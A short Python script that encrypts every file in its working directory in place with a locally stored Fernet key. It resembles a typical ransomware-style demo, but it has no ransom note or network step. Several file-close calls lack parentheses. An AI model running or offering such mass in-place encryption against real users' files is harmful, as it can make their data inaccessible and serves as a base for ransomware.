import os
from cryptography.fernet import Fernet

### Variable Declatations ###

file_list = []
key_path = "./key.key"

### Function Definitions ###

def generate_file_list():
    for file in os.listdir():
            if file == "encrypt.py" or file == "key.key" or file == "decrypt.py":
                continue
            if os.path.isfile(file):
                file_list.append(file)

def generate_encryption_key():
    print("Generating key.")
    key = Fernet.generate_key()

    key_file = open("key.key", "wb")
    key_file.write(key)
    key_file.close()

    print("Key generated.")

def check_key():
    return os.path.isfile(key_path)

def encrypt_files():
    key_file = open("key.key", "rb")
    f = Fernet(key_file.read())
    key_file.close

    print("Encrypting files.")

    for file in file_list:
        file_to_encrypt = open(file, "rb")
        file_contents = file_to_encrypt.read()
        file_to_encrypt.close
        file_to_encrypt = open(file, "wb")
        file_to_encrypt.write(f.encrypt(file_contents))
        file_to_encrypt.close
    print("Files encrypted.")

### Running the Program ###

generate_file_list()

if check_key():
    print("Key already found.")
    print("Files previously encrypted.")
else:
    print("Key not found.")
    generate_encryption_key()
    encrypt_files()